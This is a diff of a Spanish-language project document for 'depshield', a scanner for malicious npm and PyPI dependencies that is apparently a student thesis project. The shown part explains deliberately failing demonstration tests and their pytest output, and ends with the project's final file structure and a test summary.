+#### FAIL 4 — Falso negativo de detección
+
+```python
+def test_fail_undetected_obfuscation(self, tmp_path):
+    py_file = tmp_path / "normal.py"
+    py_file.write_text("print('hello world')\n")
+    findings = py_analyze_file(str(py_file))
+    obfuscation = [f for f in findings if f.signal_type == "OBFUSCATION"]
+    assert len(obfuscation) >= 1  # WRONG: print() NO es ofuscacion
+```
+
+**Error:** El desarrollador asume que `print()` debería detectarse como ofuscación, pero el analizador correctamente lo ignora porque `print()` es una función estándar de Python, no una función sospechosa.
+
+**Salida de pytest:**
+```
+E       AssertionError: Se esperaba que print() generara un finding de
+E       OBFUSCATION, pero el analizador correctamente no lo detecta.
+E       assert 0 >= 1
+E        +  where 0 = len([])
+```
+
+La lista de findings de ofuscación está **vacía** (`len([]) == 0`), lo cual es el comportamiento correcto del analizador. El test falla porque la expectativa del desarrollador es incorrecta.
+
+---
+
+#### FAIL 5 — Error en algoritmo (Levenshtein)
+
+```python
+def test_fail_levenshtein_wrong_distance(self):
+    dist = _levenshtein("lodash", "lodasj")
+    assert dist == 2  # WRONG: Sustituir 'h' por 'j' es distancia 1, no 2
+```
+
+**Error:** El desarrollador no comprende bien el algoritmo de Levenshtein. Una **sustitución** de un carácter (`h` → `j`) cuenta como **una sola operación** (distancia = 1), no dos.
+
+**Salida de pytest:**
+```
+E       AssertionError: Se esperaba distancia=2 pero se obtuvo distancia=1.
+E       Una sustitución ('h'→'j') cuenta como 1 operación, no 2.
+E       assert 1 == 2
+```
+
+### 16.7. Ejecución completa de los tests de demostración
+
+```
+$ pytest tests/test_demo_failures.py -v
+
+tests/test_demo_failures.py::TestRefPassed::test_classify_safe PASSED            [ 14%]
+tests/test_demo_failures.py::TestRefPassed::test_score_empty_findings PASSED     [ 28%]
+tests/test_demo_failures.py::TestDemoFailures::test_fail_wrong_classification FAILED [ 42%]
+tests/test_demo_failures.py::TestDemoFailures::test_fail_wrong_score_calculation FAILED [ 57%]
+tests/test_demo_failures.py::TestDemoFailures::test_fail_findings_type FAILED    [ 71%]
+tests/test_demo_failures.py::TestDemoFailures::test_fail_undetected_obfuscation FAILED [ 85%]
+tests/test_demo_failures.py::TestDemoFailures::test_fail_levenshtein_wrong_distance FAILED [100%]
+
+FAILED tests/test_demo_failures.py::TestDemoFailures::test_fail_wrong_classification
+FAILED tests/test_demo_failures.py::TestDemoFailures::test_fail_wrong_score_calculation
+FAILED tests/test_demo_failures.py::TestDemoFailures::test_fail_findings_type
+FAILED tests/test_demo_failures.py::TestDemoFailures::test_fail_undetected_obfuscation
+FAILED tests/test_demo_failures.py::TestDemoFailures::test_fail_levenshtein_wrong_distance
+
+========================= 5 failed, 2 passed in 0.15s =========================
+```
+
+**Resultado:** 2 PASSED, 5 FAILED -- exactamente como se esperaba.
+
+### 16.8. Interpretación del resultado
+
+| Test | Tipo de error | Valor esperado | Valor real | Lección |
+|---|---|---|---|---|
+| `test_fail_wrong_classification` | Valor incorrecto | `"DANGEROUS"` | `"HIGH_RISK"` | Verificar siempre los nombres exactos de las constantes |
+| `test_fail_wrong_score_calculation` | Cálculo incorrecto | `40` | `50` | Conocer los pesos del scorer (HIGH=25, no 20) |
+| `test_fail_findings_type` | Tipo inesperado | `dict` | `list` | Leer la documentación del API antes de hacer asunciones |
+| `test_fail_undetected_obfuscation` | Falso negativo | `≥ 1` finding | `0` findings | `print()` no es sospechoso; el analizador es correcto |
+| `test_fail_levenshtein_wrong_distance` | Error algorítmico | `2` | `1` | Una sustitución es 1 operación en Levenshtein |
+
+### 16.9. ¿Qué ocurre cuando un test falla en desarrollo real?
+
+En un proyecto real, un test FAILED indica una de estas situaciones:
+
+1. **Bug en el código** → el test detectó un error real que hay que corregir.
+2. **Test mal escrito** → la expectativa del test es incorrecta y hay que actualizarlo.
+3. **Cambio de especificación** → el comportamiento cambió intencionadamente y los tests deben adaptarse.
+
+El ciclo de desarrollo con tests (TDD/Test-Driven Development) es:
+
+```
+1. Escribir el test        → Define qué se espera
+2. Ejecutar → FAILED       → Normal: el código aún no existe
+3. Implementar el código   → Hacer que el test pase
+4. Ejecutar -> PASSED       -> La funcionalidad es correcta
+5. Refactorizar            → Mejorar el código manteniendo tests verdes
+```
+
+### 16.10. Nota
+
+El fichero `test_demo_failures.py` es **exclusivamente para documentación** del TFG. No forma parte de la suite regular de tests. Los 40 tests reales (`test_scanner.py` + `test_modules.py`) siguen pasando correctamente (40/40 PASSED en 0.37s).
+
+---
+
+## 17. Estado final del proyecto
+
+> **Última actualización:** 20 de abril de 2026
+> **Estado:** ✅ **PROYECTO COMPLETADO** — Todos los 12 pasos (0-11) implementados + validación adicional.
+
+### Estructura de ficheros final
 
 ```
 depshield/
 ├── depshield/
 │   ├── __init__.py               # v0.1.0
-│   ├── cli.py                    # CLI con click (scan stub)
+│   ├── __main__.py               # Soporte para python -m depshield
+│   ├── cli.py                    # ✅ PASO 8 — CLI completa
 │   ├── resolvers/
 │   │   ├── __init__.py
 │   │   ├── npm_resolver.py       # ✅ PASO 1
@@ -1852,33 +3402,59 @@ depshield/
 │   │   ├── js_analyzer.py        # ✅ PASO 4
 │   │   ├── py_analyzer.py        # ✅ PASO 5
 │   │   └── metadata_analyzer.py  # ✅ PASO 6
-│   └── scoring/
+│   ├── scoring/
+│   │   ├── __init__.py
+│   │   ├── scorer.py             # ✅ PASO 7
+│   │   └── report.py             # ✅ PASO 7
+│   └── core/
 │       ├── __init__.py
-│       ├── scorer.py             # ✅ PASO 7
-│       └── report.py             # ✅ PASO 7
+│       └── scanner.py            # ✅ PASO 8
 ├── tests/
-│   └── __init__.py
-├── .venv/                        # Entorno virtual
+│   ├── __init__.py
+│   ├── test_scanner.py           # ✅ PASO 8 — 20 tests unitarios
+│   ├── test_modules.py           # ✅ Validación — 20 tests unitarios
+│   ├── fixtures/
+│   │   └── osv_reports/          # ✅ PASO 9 — 8 reportes OSV
+│   ├── integration/
+│   │   ├── __init__.py
+│   │   └── test_known_malicious.py  # ✅ PASO 9 — 13 tests
+│   └── benchmarks/
+│       ├── __init__.py
+│       └── test_vs_guarddog.py      # ✅ PASO 10 — 21 tests
+├── .venv/
 ├── .gitignore
-├── pyproject.toml
-├── README.md
-├── SETUP.md                      # Guía de configuración del entorno
+├── pyproject.toml                # ✅ Configuración + guarddog dep
+├── README.md                     # ✅ PASO 11 — Documentación completa
+├── ARCHITECTURE.md               # ✅ PASO 11 — Arquitectura + diagramas
+├── SETUP.md                      # Guía de configuración
 └── setup.bat                     # Script de configuración automática
 ```
 
-### Próximos pasos
+### Resumen de todos los tests
 
-| Paso | Módulo | Estado |
-|---|---|---|
-| ~~0~~ | ~~Proyecto base~~ | ✅ Completado |
-| ~~1~~ | ~~npm resolver~~ | ✅ Completado |
-| ~~2~~ | ~~PyPI resolver~~ | ✅ Completado |
-| ~~3~~ | ~~Downloader~~ | ✅ Completado |
-| ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
-| ~~5~~ | ~~Python analyzer~~ | ✅ Completado |
-| ~~6~~ | ~~Metadata analyzer~~ | ✅ Completado |
-| ~~7~~ | ~~Scorer + Report~~ | ✅ Completado |
-| **8** | **Scanner + CLI** | ⏳ Pendiente |
-| 9 | Tests integración | ⏳ Pendiente |
-| 10 | Benchmark vs GuardDog | ⏳ Pendiente |
-| 11 | Documentación final | ⏳ Pendiente |
+| Categoría | Fichero | Tests | Tiempo | Requiere red |
+|---|---|---|---|---|
+| Unitarios (scanner) | `test_scanner.py` | 20 | 0.19s | ❌ |
+| Unitarios (módulos) | `test_modules.py` | 20 | 0.73s | ❌ |
+| Integración | `test_known_malicious.py` | 13 | ~30-60s | ✅ |
+| Benchmark | `test_vs_guarddog.py` | 21 | ~5min | ✅ |
+| **Total** | **4 ficheros** | **74 tests** | — | — |
+
+### Resumen de todos los pasos
+
+| Paso | Módulo | Estado | Tests |
+|---|---|---|---|
+| ~~0~~ | ~~Proyecto base~~ | ✅ Completado | — |
+| ~~1~~ | ~~npm resolver~~ | ✅ Completado | ✅ |
+| ~~2~~ | ~~PyPI resolver~~ | ✅ Completado | ✅ |
+| ~~3~~ | ~~Downloader~~ | ✅ Completado | ✅ |
+| ~~4~~ | ~~JS analyzer~~ | ✅ Completado | ✅ 4 tests |
+| ~~5~~ | ~~Python analyzer~~ | ✅ Completado | ✅ 4 tests |
+| ~~6~~ | ~~Metadata analyzer~~ | ✅ Completado | ✅ 4 tests |
+| ~~7~~ | ~~Scorer + Report~~ | ✅ Completado | ✅ 8 tests |
+| ~~8~~ | ~~Scanner + CLI~~ | ✅ Completado | ✅ 20 tests |
+| ~~9~~ | ~~Tests integración~~ | ✅ Completado | ✅ 13 tests |
+| ~~10~~ | ~~Benchmark vs GuardDog~~ | ✅ Completado | ✅ 21 tests |
+| ~~11~~ | ~~Documentación final~~ | ✅ Completado | ✅ Code review |
+
+
